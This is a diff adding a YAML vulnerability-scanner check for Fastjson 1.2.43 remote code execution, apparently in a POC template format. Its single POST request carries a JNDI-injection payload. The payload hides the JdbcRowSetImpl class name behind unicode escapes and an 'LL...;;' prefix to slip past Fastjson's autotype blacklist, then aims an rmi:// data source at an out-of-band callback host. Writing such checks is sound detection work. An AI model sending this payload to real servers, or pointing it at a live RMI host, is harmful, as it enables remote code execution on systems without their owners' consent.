@@ -1,0 +1,19 @@
+name: fastjson-1-2-43-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;",
+           "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+           "autoCommit":true
+        }
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0() 
